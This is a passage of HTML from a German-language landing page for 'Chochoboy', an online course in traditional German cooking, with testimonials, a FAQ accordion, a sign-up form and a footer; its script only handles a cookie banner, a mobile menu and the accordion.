          <img src="images/avatar1.jpg" alt="Klaus Müller" width="44" height="44" class="w-11 h-11 rounded-full object-cover ring-2 ring-gray-100" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Klaus Müller</div>
            <div class="text-xs text-gray-400">Hobbykoch aus München</div>
          </div>
        </div>
      </div>
      <!-- Card 2 — primary accent, active -->
      <div class="bg-primary rounded-2xl p-7 shadow-xl scale-105">
        <div class="flex gap-1 mb-3">
          <svg class="w-5 h-5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-white text-sm leading-relaxed mb-6">"Als professionelle Köchin war ich skeptisch, aber die deutschen Traditionsrezepte bei Chochoboy haben mich beeindruckt. Ich habe Techniken gelernt, die ich so noch nirgendwo gesehen hatte. Das Zertifizierungsprogramm hat mir zusätzliche Glaubwürdigkeit in meinem Berufsalltag verliehen."</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar2.jpg" alt="Sabine Hoffmann" width="44" height="44" class="w-11 h-11 rounded-full object-cover ring-2 ring-white/30" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-white">Sabine Hoffmann</div>
            <div class="text-xs text-white/60">Professionelle Köchin aus Berlin</div>
          </div>
        </div>
      </div>
      <!-- Card 3 -->
      <div class="bg-white rounded-2xl p-7 shadow-sm border border-gray-100">
        <div class="flex gap-1 mb-3">
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-6">"Die Live-Kochsessions bei Chochoboy sind einfach fantastisch. Ich konnte direkt Fragen stellen und bekam sofort hilfreiche Antworten. Die deutschen Rezepte sind detailliert beschrieben und leicht nachvollziehbar. Meine Familie liebt es, wenn ich die erlernten traditionellen Gerichte zubereite."</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar3.jpg" alt="Thomas Becker" width="44" height="44" class="w-11 h-11 rounded-full object-cover ring-2 ring-gray-100" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Thomas Becker</div>
            <div class="text-xs text-gray-400">Kochbegeisterter aus Hamburg</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- FAQ — clean accordion with animated chevron -->
<section id="faq" class="py-20 bg-white">
  <div class="max-w-3xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Häufige Fragen</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Alles, was Sie über unsere Rezeptkurse wissen möchten</h2>
    </div>
    <div class="space-y-3">
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Für wen sind die Chochoboy Rezeptkurse geeignet?</span>
          <svg class="faq-chevron w-5 h-5 text-primary shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-body px-6 pb-5 text-gray-500 text-sm leading-relaxed">Unsere Rezeptkurse sind für alle geeignet – von Kochanfängern bis hin zu erfahrenen Profiköchen. Wir bieten verschiedene Kursstufen an, sodass jeder genau das richtige Niveau für seine Fähigkeiten und Interessen an deutschen traditionellen Rezepten findet.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Wie lange dauert ein Rezeptkurs bei Chochoboy?</span>
          <svg class="faq-chevron w-5 h-5 text-primary shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-body px-6 pb-5 text-gray-500 text-sm leading-relaxed">Die Dauer unserer Kurse variiert je nach Thema und Niveau. Grundkurse dauern etwa 4 Wochen, während der Meisterkochkurs bis zu 12 Wochen umfassen kann. Sie können jederzeit in Ihrem eigenen Tempo lernen und haben unbegrenzten Zugang zu allen Kursmaterialien.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Bekomme ich nach dem Kurs ein Zertifikat?</span>
          <svg class="faq-chevron w-5 h-5 text-primary shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-body px-6 pb-5 text-gray-500 text-sm leading-relaxed">Ja, nach erfolgreichem Abschluss eines Chochoboy Rezeptkurses erhalten Sie ein offizielles Zertifikat, das Ihre Kenntnisse in deutschen traditionellen Rezepten bestätigt. Dieses Zertifikat ist in der Gastronomiebranche anerkannt und kann Ihre Karriere fördern.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Welche Zutaten benötige ich für die deutschen Rezeptkurse?</span>
          <svg class="faq-chevron w-5 h-5 text-primary shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-body px-6 pb-5 text-gray-500 text-sm leading-relaxed">Zu Beginn jedes Kurses erhalten Sie eine detaillierte Zutatenliste für alle behandelten deutschen Rezepte. Die meisten Zutaten sind in deutschen Supermärkten leicht erhältlich. Für spezielle traditionelle Zutaten geben wir Ihnen gerne Empfehlungen für Bezugsquellen.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Kann ich die Rezeptkurse auf mobilen Geräten nutzen?</span>
          <svg class="faq-chevron w-5 h-5 text-primary shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-body px-6 pb-5 text-gray-500 text-sm leading-relaxed">Absolut! Unsere Plattform ist vollständig für mobile Geräte optimiert. Sie können die deutschen Rezeptkurse auf Smartphone, Tablet oder Computer absolvieren. So haben Sie jederzeit und überall Zugang zu Ihren Kochkursen und Rezepten.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Wie viel kosten die Rezeptkurse bei Chochoboy?</span>
          <svg class="faq-chevron w-5 h-5 text-primary shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-body px-6 pb-5 text-gray-500 text-sm leading-relaxed">Wir bieten verschiedene Preismodelle an, von Einzelkursen bis hin zu Jahresabonnements. Die genauen Preise finden Sie auf unserer Preisseite. Wir glauben daran, dass hochwertige Rezeptausbildung für jeden erschwinglich sein sollte, und bieten regelmäßig Sonderaktionen an.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Was passiert, wenn ich mit einem Rezept nicht zurechtkomme?</span>
          <svg class="faq-chevron w-5 h-5 text-primary shrink-0 ml-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-body px-6 pb-5 text-gray-500 text-sm leading-relaxed">Kein Problem! Unser Expertensupport-Team steht Ihnen jederzeit zur Verfügung. Sie können Fragen zu deutschen Rezepten per E-Mail oder in unseren Live-Sessions stellen. Wir helfen Ihnen, jeden Schritt zu meistern und Ihre Kochfähigkeiten kontinuierlich zu verbessern.</div>
      </div>
    </div>
  </div>
</section>

<!-- CTA — two-column: left headline + bullets, right form -->
<section id="cta" class="py-20 bg-slate-900">
  <div class="max-w-6xl mx-auto px-4">
    <div class="flex flex-col lg:flex-row gap-14 items-start">
      <!-- Left -->
      <div class="flex-1">
        <h2 class="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">Starten Sie jetzt Ihre Reise zur deutschen Kochmeisterschaft</h2>
        <p class="text-slate-400 text-lg mb-8 leading-relaxed">Melden Sie sich an und erhalten Sie sofortigen Zugang zu unseren traditionellen deutschen Rezeptkursen.</p>
        <ul class="space-y-4">
          <li class="flex items-start gap-3 text-slate-300">
            <svg class="w-6 h-6 text-green-400 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
            <span>Authentische Rezepte — Alle unsere deutschen Rezepte sind von echten Meisterköchen entwickelt und auf ihre Authentizität und traditionellen Wurzeln geprüft worden.</span>
          </li>
          <li class="flex items-start gap-3 text-slate-300">
            <svg class="w-6 h-6 text-green-400 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
            <span>Flexibles Lernen — Lernen Sie in Ihrem eigenen Tempo mit unbegrenztem Zugang zu allen Rezeptkursen und Lernmaterialien auf jeder Plattform.</span>
          </li>
          <li class="flex items-start gap-3 text-slate-300">
            <svg class="w-6 h-6 text-green-400 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
            <span>Expertenunterstützung — Unsere erfahrenen Meisterköche begleiten Sie durch jeden Schritt Ihrer Kochausbildung und beantworten alle Ihre Fragen zu deutschen Rezepten.</span>
          </li>
        </ul>
      </div>
      <!-- Right: form -->
      <div class="flex-1 w-full max-w-md bg-white rounded-2xl p-8 shadow-2xl">
        <h3 class="text-xl font-bold text-gray-900 mb-6">Kostenlos anmelden</h3>
        <form class="space-y-4" onsubmit="return false;">
          <input type="text" placeholder="Ihr vollständiger Name" class="w-full px-4 py-3 border border-gray-200 rounded-xl text-gray-900 focus:outline-none focus:ring-2 focus:border-transparent transition" style="--tw-ring-color: #10B981;" required>
          <input type="email" placeholder="Ihre E-Mail-Adresse" class="w-full px-4 py-3 border border-gray-200 rounded-xl text-gray-900 focus:outline-none focus:ring-2 focus:border-transparent transition" required>
          <button type="submit" class="w-full px-6 py-4 text-white font-bold rounded-xl btn-primary transition text-base">Kostenlos anmelden</button>
        </form>
        <p class="text-gray-400 text-xs mt-4 text-center">Mit der Anmeldung stimmen Sie unserer <a href="privacy-policy.html" class="underline text-gray-500">Datenschutzerklärung zu</a></p>
      </div>
    </div>
  </div>
</section>

<!-- Disclaimer -->


<!-- Footer -->
<footer id="main-footer" class="bg-white border-t border-gray-100 py-14">
  <div class="max-w-6xl mx-auto px-4">
    <div class="grid grid-cols-1 md:grid-cols-4 gap-10 mb-10">
      <div class="md:col-span-2">
        <div class="flex items-center gap-2 mb-4">
          <div class="w-8 h-8 rounded-lg flex items-center justify-center bg-primary">
            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17H3a2 2 0 01-2-2V5a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2h-2"/></svg>
          </div>
          <span class="text-xl font-bold text-gray-900">Chochoboy</span>
        </div>
        <p class="text-sm text-gray-500 leading-relaxed max-w-xs mb-5">Chochoboy bietet authentische deutsche Rezeptkurse und Meisterkochangebote für alle Kochlevel in Deutschland.</p>
        <div class="text-sm text-gray-500 space-y-1.5">
          <div>Kurfürstendamm 45, 10719 Berlin, Deutschland</div>
          <div>+49 30 1234 5678</div>
          <div>info@chochoboy-site.com</div>
        </div>
      </div>
      <div>
        <div class="text-gray-900 font-semibold text-sm mb-4">Navigation</div>
        <ul class="space-y-2.5 text-sm text-gray-500">
          <li><a href="/" class="hover:text-primary transition">Startseite</a></li>
          <li><a href="about.html" class="hover:text-primary transition">Über uns</a></li>
          <li><a href="contact.html" class="hover:text-primary transition">Kontakt</a></li>
        </ul>
      </div>
      <div>
        <div class="text-gray-900 font-semibold text-sm mb-4">Rechtliches</div>
        <ul class="space-y-2.5 text-sm text-gray-500">
          <li><a href="privacy-policy.html" class="hover:text-primary transition">Datenschutz</a></li>
          <li><a href="terms.html" class="hover:text-primary transition">AGB</a></li>
        </ul>
      </div>
    </div>
    <div class="border-t border-gray-100 pt-6 flex flex-col md:flex-row items-center justify-between gap-2 text-xs text-gray-400">
      <span>© 2025 Chochoboy. Alle Rechte vorbehalten.</span>
      <span>Made with care by Chochoboy</span>
    </div>
  </div>
</footer>

<script>
  // Cookie banner
  function acceptCookies(type) {
    localStorage.setItem('cookies_accepted', type);
    document.getElementById('cookie-banner').style.display = 'none';
  }
  window.addEventListener('DOMContentLoaded', function() {
    if (!localStorage.getItem('cookies_accepted')) {
      document.getElementById('cookie-banner').style.display = 'block';
    }
  });

  // Mobile menu
  function toggleMenu() {
    var m = document.getElementById('mobile-menu');
    m.classList.toggle('hidden');
  }

  // FAQ accordion with animated chevron
  function toggleFaq(btn) {
    var body = btn.nextElementSibling;
    var chevron = btn.querySelector('.faq-chevron');
    // Close others
    document.querySelectorAll('.faq-body.open').forEach(function(el) {
      if (el !== body) {
        el.classList.remove('open');
        el.previousElementSibling.querySelector('.faq-chevron').classList.remove('open');
      }
    });
    body.classList.toggle('open');
    chevron.classList.toggle('open');
  }
</script>
</body>
</html>
